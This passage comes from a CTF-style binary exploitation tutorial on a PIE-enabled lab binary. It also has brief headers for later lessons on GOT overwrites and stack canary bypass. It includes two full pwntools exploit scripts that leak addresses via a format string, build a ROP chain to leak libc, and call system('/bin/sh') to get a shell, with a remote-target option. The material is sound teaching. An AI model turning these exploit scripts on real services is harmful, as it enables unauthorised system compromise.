      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Offset to RIP, found manually with GDB
      offset = 264
      
      # Start program
      io = start()
      
      # Offset of pop_rdi gadget from ropper
      # We need to find the PIEBASE before we can use
      pop_rdi_offset = 0x12ab
      
      # Leak 15th address from stack (main+44)
      io.sendlineafter(b':', '%{}$p'.format(15), 16)
      io.recvuntil(b'Hello ')  # Address will follow
      leaked_addr = int(io.recvline(), 16)
      info("leaked_address: %#x", leaked_addr)
      
      # Now calculate the PIEBASE
      elf.address = leaked_addr - 0x1224
      info("piebase: %#x", elf.address)
      
      # Update pop_rdi gadget
      pop_rdi = elf.address + pop_rdi_offset
      
      # Payload to leak libc function
      payload = flat({
          offset: [
              pop_rdi,  # Pop got.puts into RDI
              elf.got.puts,
              elf.plt.puts,  # Call puts() to leak the got.puts address
              elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
          ]
      })
      
      # Send the payload
      io.sendlineafter(b':P', payload)
      
      io.recvlines(2)  # Blank line
      
      # Retrieve got.puts address
      got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
      info("leaked got_puts: %#x", got_puts)
      
      # Subtract puts offset to get libc base
      # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
      libc_base = got_puts - 0x765f0
      info("libc_base: %#x", libc_base)
      
      # Add offsets to get system() and "/bin/sh" addresses
      # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
      system_addr = libc_base + 0x48e50
      info("system_addr: %#x", system_addr)
      # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
      bin_sh = libc_base + 0x18a152
      info("bin_sh: %#x", bin_sh)
      
      # Payload to get shell: system('/bin/sh')
      payload = flat({
          offset: [
              pop_rdi,
              bin_sh,
              system_addr
          ]
      })
      
      # Send the payload
      io.sendline(payload)
      
      # Got Shell?
      io.interactive()
      ```
   

### 8. Autopwn script
   ```
   from pwn import *
   
   # Allows you to switch between local/GDB/remote from terminal
   def start(argv=[], *a, **kw):
       if args.GDB:  # Set GDBscript below
           return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
       elif args.REMOTE:  # ('server', 'port')
           return remote(sys.argv[1], sys.argv[2], *a, **kw)
       else:  # Run locally
           return process([exe] + argv, *a, **kw)
   
   # Specify your GDB script here for debugging
   gdbscript = '''
   init-pwndbg
   continue
   '''.format(**locals())
   
   # Set up pwntools for the correct architecture
   exe = './pie_server'
   # This will automatically get context arch, bits, os etc
   elf = context.binary = ELF(exe, checksec=False)
   # Enable verbose logging so we can see exactly what is being sent (info/debug)
   context.log_level = 'debug'
   
   # ===========================================================
   #                    EXPLOIT GOES HERE
   # ===========================================================
   
   # Lib-C library
   libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
   
   # Offset to RIP, found manually with GDB
   offset = 264
   
   # Start program
   io = start()
   
   # Offset of pop_rdi gadget from ropper
   # We need to find the PIEBASE before we can use
   pop_rdi_offset = 0x12ab
   
   # Leak 15th address from stack (main+44)
   io.sendlineafter(b':', '%{}$p'.format(15), 16)
   io.recvuntil(b'Hello ')  # Address will follow
   leaked_addr = int(io.recvline(), 16)
   info("leaked_address: %#x", leaked_addr)
   
   # Now calculate the PIEBASE
   elf.address = leaked_addr - 0x1224
   info("piebase: %#x", elf.address)
   
   # Update pop_rdi gadget
   pop_rdi = elf.address + pop_rdi_offset
   
   # Payload to leak libc function
   payload = flat({
       offset: [
           pop_rdi,  # Pop got.puts into RDI
           elf.got.puts,
           elf.plt.puts,  # Call puts() to leak the got.puts address
           elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
       ]
   })
   
   # Send the payload
   io.sendlineafter(b':P', payload)
   
   io.recvlines(2)  # Blank line
   
   # Retrieve got.puts address
   got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
   info("leaked got_puts: %#x", got_puts)
   
   # Subtract puts offset to get libc base
   libc.address = got_puts - libc.symbols.puts
   info("libc_base: %#x", libc.address)
   
   # Payload to get shell: system('/bin/sh')
   payload = flat({
       offset: [
           pop_rdi,
           next(libc.search(b'/bin/sh\x00')),
           libc.symbols.system
       ]
   })
   
   # Send the payload
   io.sendline(payload)
   
   # Got Shell?
   io.interactive()
   ```

## ==================================================================

## (9) Overwriting Global Offset Table (GOT) Entries with printf()
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/09-overwriting_got

**NX/DEP & Stack Canary are ENABLED**
+ We will be using _format string write operation_ to overwrite something in the 
  Global Offset Table (GOT)




## ==================================================================

## (10) Bypassing Stack Canaries (leak+write)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries



## ==================================================================
-
